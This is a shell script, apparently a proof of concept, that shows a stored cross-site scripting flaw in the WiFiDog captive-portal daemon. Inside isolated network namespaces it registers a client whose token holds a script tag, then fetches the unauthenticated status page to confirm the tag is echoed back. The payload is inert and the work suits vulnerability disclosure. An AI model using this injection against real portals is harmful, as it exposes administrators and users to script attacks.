#!/usr/bin/env sh
set -eu

ROOT_DIR="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
WIFIDOG="$ROOT_DIR/src/wifidog"
CONF="$ROOT_DIR/poc/wifidog-veth.conf"
LOG="$ROOT_DIR/poc/poc-status-stored-xss.log"
RESP="$ROOT_DIR/poc/poc-status-stored-xss.response.html"

command -v unshare >/dev/null 2>&1 || { echo "error: unshare not found" >&2; exit 1; }
command -v nsenter >/dev/null 2>&1 || { echo "error: nsenter not found" >&2; exit 1; }
command -v ip >/dev/null 2>&1 || { echo "error: ip not found" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: python3 not found" >&2; exit 1; }

rm -f "$LOG" "$RESP"

unshare -Urn sh -c "
set -eu
cd \"$ROOT_DIR\"
ip link set lo up
rm -f /tmp/wdctl-wifidog-poc.sock

# Create a separate client netns so the server learns the client's MAC via ARP.
# NOTE: avoid --fork so the PID we capture is the namespace "anchor" process.
unshare -n sh -c 'ip link set lo up; sleep 600' &
client_pid=\$!

ip link add veth0 type veth peer name veth1
ip link set veth1 netns \$client_pid

ip addr add 10.0.0.1/24 dev veth0
ip link set veth0 up

nsenter -t \$client_pid -n ip addr add 10.0.0.2/24 dev veth1
nsenter -t \$client_pid -n ip link set veth1 up

# Minimal auth server so WiFiDog marks auth reachable.
python3 - <<'PY' &
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/ping/'):
            body = b'Pong'
        elif self.path.startswith('/auth/'):
            body = b'Auth: 1'
        else:
            body = b'OK'
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, fmt, *args):
        pass

HTTPServer(('0.0.0.0', 8081), H).serve_forever()
PY
auth_pid=\$!

\"$WIFIDOG\" -f -c \"$CONF\" -d 0 >\"$LOG\" 2>&1 &
pid=\$!

for i in 1 2 3 4 5 6 7 8 9 10; do
  nsenter -t \$client_pid -n python3 - <<'PY' && break || true
import socket, sys
try:
    s = socket.create_connection(('10.0.0.1', 2060), timeout=0.2)
    s.close()
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  sleep 0.2
done

# 1) Register a client with a token containing HTML/script payload.
nsenter -t \$client_pid -n python3 - <<'PY'
import socket
token = \"WIFIDOG_STORED_XSS_POC<script>/*poc*/</script>\"
req = (
    \"GET /wifidog/auth?token=\" + token + \" HTTP/1.0\\r\\n\"
    \"Host: 10.0.0.1\\r\\n\"
    \"\\r\\n\"
)
s = socket.create_connection(('10.0.0.1', 2060), timeout=2.0)
s.sendall(req.encode('utf-8', errors='ignore'))
s.recv(1024)
s.close()
PY

# 2) Fetch the status page (unauthenticated by default) and save it.
nsenter -t \$client_pid -n python3 - <<'PY' >\"$RESP\"
import socket
req = (
    \"GET /wifidog/status HTTP/1.0\\r\\n\"
    \"Host: 10.0.0.1\\r\\n\"
    \"\\r\\n\"
)
s = socket.create_connection(('10.0.0.1', 2060), timeout=2.0)
s.sendall(req.encode())
data = b\"\"
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk
s.close()
print(data.decode('utf-8', errors='ignore'))
PY

kill \"\$pid\" 2>/dev/null || true
kill \"\$auth_pid\" 2>/dev/null || true
kill \"\$client_pid\" 2>/dev/null || true
sleep 0.2
kill -9 \"\$pid\" 2>/dev/null || true
kill -9 \"\$auth_pid\" 2>/dev/null || true
kill -9 \"\$client_pid\" 2>/dev/null || true
wait \"\$pid\" || true
wait \"\$auth_pid\" || true
wait \"\$client_pid\" || true
"

echo "Log: $LOG"
echo "Response: $RESP"
if command -v rg >/dev/null 2>&1; then
  rg -n "WIFIDOG_STORED_XSS_POC" "$RESP" || true
  rg -n "<script>\\/*poc*\\/</script>" "$RESP" || true
fi
